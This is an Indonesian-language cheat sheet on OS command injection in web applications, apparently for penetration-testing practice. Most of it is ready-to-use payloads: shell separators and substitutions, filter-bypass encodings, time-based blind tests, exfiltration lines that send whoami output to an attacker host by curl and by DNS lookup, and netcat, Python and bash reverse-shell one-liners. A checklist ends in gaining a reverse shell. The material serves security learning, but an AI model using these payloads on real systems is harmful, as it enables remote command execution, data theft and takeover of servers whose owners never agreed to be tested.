# 💉 Command Injection — Mengeksekusi Perintah di Server

> **Tujuan:** Mengeksekusi perintah OS di server target melalui input aplikasi web yang rentan.

---

## 📌 Penjelasan Singkat

Command Injection terjadi ketika aplikasi **memasukkan input user ke shell tanpa sanitasi**, sehingga attacker bisa menjalankan perintah OS apa pun.

---

## 🔍 Ciri-Ciri Aplikasi Rentan

- Input user dimasukkan ke command shell.
- Aplikasi menampilkan output dari perintah shell.
- Time-based test menghasilkan delay yang jelas.

---

## ⚙️ Payload: Separator (dari yang mudah ke sulit)

### Tipe 1: Eksekusi Berurutan

```bash
;id
# Semicolon: eksekusi perintah setelahnya
```

```bash
|id
# Pipe: teruskan output, sering mengabaikan perintah awal
```

**Contoh response vulnerable:**

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

---

### Tipe 2: Logic-Based

```bash
||id
# OR: eksekusi HANYA jika perintah pertama GAGAL
```

```bash
&&id
# AND: eksekusi HANYA jika perintah pertama BERHASIL
```

```bash
&id
# Background: jalankan di latar belakang
```

---

### Tipe 3: Command Substitution

```bash
$(id)
# Command substitution, sama seperti backticks
```

```bash
`id`
# Backticks: inline execution (deprecated tapi masih banyak dipakai)
```

---

### Tipe 4: Bypass Filter

```bash
%0aid
# URL-encoded Newline: bypass filter dengan karakter enter
```

```bash
;id;
# Inline semicolon: sisipkan perintah di tengah query
```

```bash
|id|
# Inline pipe: eksekusi di antara pipe
```

---

## 🔇 Blind Command Injection (Tanpa Output Langsung)

Jika tidak ada output, gunakan teknik **exfiltration** atau **time-based**.

### Time-Based Detection

```bash
;sleep 5
# Jika web loading lambat (5 detik), target rentan
```

**Cara kerja:**

```text
INPUT:  127.0.0.1 ; sleep 5
RESPONSE TIME: 5.2 seconds
# Artinya command `sleep 5` dieksekusi di server
```

### HTTP Exfiltration

```bash
;curl http://<LHOST>/$(whoami)
# Kirim hasil eksekusi (whoami) ke server attacker
```

**Cara kerja:**

```text
1. Target menjalankan: curl http://10.0.2.5/$(whoami)
2. Server attacker menerima request: GET /www-data
3. Kita bisa lihat user target di access log
```

### DNS Exfiltration

```bash
;nslookup $(whoami).attacker.com
# Exfiltrate data lewat DNS query
```

---

## 🛠️ Contoh Exploitasi

### Reverse Shell via Command Injection

```bash
# Netcat reverse shell
; nc -e /bin/bash <KALI_IP> <PORT>

# Python reverse shell
; python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<KALI_IP>",<PORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'

# Bash reverse shell
; bash -i >& /dev/tcp/<KALI_IP>/<PORT> 0>&1
```

---

## 📋 Tabel Ringkasan Payload

| Payload | Tujuan |
|---------|--------|
| `; id` | Eksekusi berurutan |
| `\| id` | Pipe (output → input) |
| `\|\| id` | Eksekusi jika cmd1 gagal |
| `&& id` | Eksekusi jika cmd1 sukses |
| `& id` | Background process |
| `$(id)` | Command substitution |
| `` `id` `` | Backtick substitution |
| `%0aid` | URL-encoded newline |
| `;sleep 5` | Blind time-based |
| `;curl ...` | Blind HTTP exfil |

---

## ⚠️ Catatan Penting

- **Cek dulu** apakah output muncul langsung (reflected) atau buta (blind).
- **Untuk blind**, time-based paling mudah; exfiltration butuh listener di Kali.
- **Selalu encode karakter** jika ada filter (URL-encode, double-encode).
- **Reverse shell** memberikan akses interaktif penuh.

---

## ✅ Checklist Deteksi Command Injection

- [ ] Test dengan `; whoami` (reflected)
- [ ] Test dengan `| whoami`
- [ ] Test dengan `|| whoami` (logic)
- [ ] Test dengan `$(whoami)` (substitution)
- [ ] Test dengan `; sleep 5` (blind time)
- [ ] Test dengan `; curl ...` (blind exfil)
- [ ] Exploitasi: reverse shell

---

## 📚 Referensi

- [OWASP Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
- [PayloadsAllTheThings - Command Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)
